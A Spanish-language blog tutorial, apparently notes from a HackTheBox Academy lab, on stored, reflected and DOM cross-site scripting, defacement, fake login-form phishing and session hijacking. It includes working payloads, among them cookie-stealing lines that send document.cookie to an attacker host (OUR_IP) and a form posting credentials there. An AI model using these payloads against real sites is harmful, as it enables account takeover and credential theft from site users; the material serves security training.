Cross-Site Scripting

Posted Aug 12, 2022
By ArVillalobos
6 min read

Stored XSS

Este XSS es aquel que se queda guardad en el backend de la página web, es el más peligroso de todos porque otro usuario puede ser víctima de este mismo, para analizar si hay un XSS podemos usar alert, aunque si vemos que alert está bloqueado por alguna razón podemos hacer uno de print. El uso de document.cookie nos servirá para robar la cookie de sesión de un usuario que se esté logeado.

1
2
3
4
5

<script>alert(window.origin)</script>

<script>print()</script>

<script>alert(document.cookie)</script>

Viendo el código fuente efectivamente podemos ver que se está guardando nuestro comando.

</ul></ul>

Reflected XSS

Este tipo de XSS se considera no persistente porque al recargar la página este no se ejecuta, esto es porque se ejecuta cuando se hacer una petición GET al servidor, si queremos robar una cookie de sesión lo mejor sería mandar la url que nos aparece y así cuando la persona la abra robemos su cookie.

1
2
3

<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(document.cookie)</script>' could not be added.</div></ul>

http://134.122.106.163:30110/index.php?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E

DOM XSS

Este tipo de XSS igualmente se considera no persistente y a diferencia del reflected este no llega al backend de la página sino que se ejecuta en el mismo DOM, este usa JavaScript para agregar contenido al DOM mediante innerHtml o similar, cuando se tiene este tipo de XSS no podremos usar <script> porque lo bloquea por medidas de seguridad, pero podemos usario img.

1

<img src="" onerror=alert(document.cookie)>

Elementos de desfiguración

Podemos utilizar código JavaScript inyectado (a través de XSS) para hacer que una página web se vea como queramos. Sin embargo, desfigurar un sitio web generalmente se usa para enviar un mensaje simple (es decir, lo pirateamos con éxito), por lo que darle a la página web desfigurada una apariencia hermosa no es realmente el objetivo principal.

Generalmente se utilizan tres elementos HTML para cambiar el aspecto principal de una página web:

Color de fondodocument.body.style.background Fondodocument.body.background Título de la páginadocument.title Texto de páginaDOM.innerHTML Podemos utilizar dos o tres de estos elementos para escribir un mensaje básico en la página web e incluso eliminar el elemento vulnerable, de modo que sería más difícil restablecer rápidamente la página web, como veremos a continuación.

Para cambiar el fondo

1
2

<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

Cambiar el título o texto del body

1
2
3

<script>document.title = 'HackTheBox Academy'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">
by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>

Phishing

El phishing nos permite crear un formulario nuevo mediante un ataque XSS que nos permita que el usuario introduzca sus credencialas para poder visualizarlos en un servicio php o python que nos montemos. Primero procedemos a ver a que tipo de XSS es vulnerable, después nos creamos un login falso

1

<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>

Session Hijacking

Por medio de un XSS podemos obtener la cookie de sesión de la persona que caiga en el ataque, normalmente esto sucede en formularios y comentarios que un administrador por detrás aprueba o lee, esto se le llama XSS-Blind, ya que no podemos ver alguna respuesta de nuestro lado pero posiblemente se vea del lado del administrador en otro máquina. Para validarlo podemos usar lo siguiente.

Teniendo respuesta procedemos a crear un archivo que al momento de llamarlo robe la cookie del usuario, hay varias maneras pero las más comunes son:

document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;

Lo que sucedió aquí es al momento de que el administrador ejecuta el XSS, llama al archivo script.js que su vez ejecuta el archivo index.php con el parámetro c para obtener la cookie. Cambiamos la cookie en el navegador y podemos entrar como el usuario víctima.
